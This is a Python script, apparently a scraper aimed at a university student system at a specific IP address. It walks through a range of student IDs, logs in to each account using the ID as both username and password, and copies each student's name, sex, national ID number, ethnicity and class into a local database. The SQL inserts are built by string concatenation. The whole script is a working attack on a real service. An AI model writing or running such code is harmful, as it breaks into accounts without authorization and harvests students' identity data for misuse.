# 思博特爬虫
import requests
from bs4 import BeautifulSoup

import pymysql
conn = pymysql.connect(host='127.0.0.1', user='root', passwd='123456', db='python')
cur = conn.cursor()

suffixs = list(range(16102101, 30999999))
for suffix in suffixs:
    try:
        # 据观察倒数第五位只能是0
        if suffix // 10000 % 10 != 0:
            continue
        if suffix < 10000000:
            student = '16220' + str(suffix)
        else:
            student = '1622' + str(suffix)
        params = {'operType': '911', 'loginflag': '0', 'loginType': '0', 'userName': student, 'passwd': student}
        r = requests.post("http://210.42.72.169/servlet/adminservlet", data=params)
        r = requests.get("http://210.42.72.169/student/studentInfo.jsp?userName="+student+"&passwd="+student, cookies=r.cookies)
        bsObj = BeautifulSoup(r.text, "lxml")
        table = bsObj.find('table', {'width': '100%', 'border': '0', 'cellpadding': '0', 'cellspacing': '1', 'bgcolor': '#cdddf4', 'class': 's9'})
        trs = table.findAll("tr")
        studentNumber = str(trs[1].td.next_sibling.next_sibling.get_text().strip())
        name = str(trs[2].td.next_sibling.next_sibling.get_text().strip())
        sex = str(trs[3].td.next_sibling.next_sibling.get_text().strip())
        IDNumber = str(trs[4].td.next_sibling.next_sibling.get_text().strip())
        Nation = str(trs[5].td.next_sibling.next_sibling.get_text().strip())
        grade = str(trs[6].td.next_sibling.next_sibling.get_text().strip())
        class_ = str(trs[7].td.next_sibling.next_sibling.get_text().strip())

        sql = "insert into students values ('" + studentNumber + "','" + name + "', '" + sex + "', '" + IDNumber + "', '" + Nation + "', '" + grade + "', '" + class_ + "')"
        try:
            cur.execute(sql)
            conn.commit()
            print(studentNumber, name, '插入数据库成功')
        except:
            # 异常处理
            print("插入失败")
    except:
        print(student+"登陆失败")
        continue